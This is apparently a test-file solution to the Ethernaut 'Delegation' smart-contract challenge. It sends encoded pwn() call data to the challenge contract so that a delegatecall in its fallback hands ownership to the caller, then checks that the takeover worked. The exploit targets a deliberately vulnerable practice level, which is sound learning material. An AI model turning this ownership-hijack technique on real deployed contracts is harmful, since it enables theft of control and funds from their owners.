import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';
import { createChallenge, submitLevel } from '../utils/utils';

describe('Delegate', () => {
  let challenge: Contract;
  beforeEach(async () => {
    const challengeFactory = await ethers.getContractFactory('Delegation');
    const challengeAddress = await createChallenge('0x73379d8B82Fda494ee59555f333DF7D44483fD58');
    challenge = challengeFactory.attach(challengeAddress);
  });
  it('solve the delegate problem', async () => {
    const abi = ['function pwn() public'];
    const iFace = new ethers.utils.Interface(abi);
    const data = iFace.encodeFunctionData('pwn', []);
    const eoa = (await ethers.getSigners())[0];
    const owner1 = await challenge.owner();
    console.log(owner1);

    const tx = await eoa.sendTransaction({
      from: eoa.address,
      to: challenge.address,
      data,
      gasLimit: BigNumber.from(`100000`),
    });
    await tx.wait();
    const owner = await challenge.owner();
    expect(owner).to.equal(eoa.address);
  });
  after(async () => {
    expect(await submitLevel(challenge.address), 'level not solved').to.be.true;
  });
});
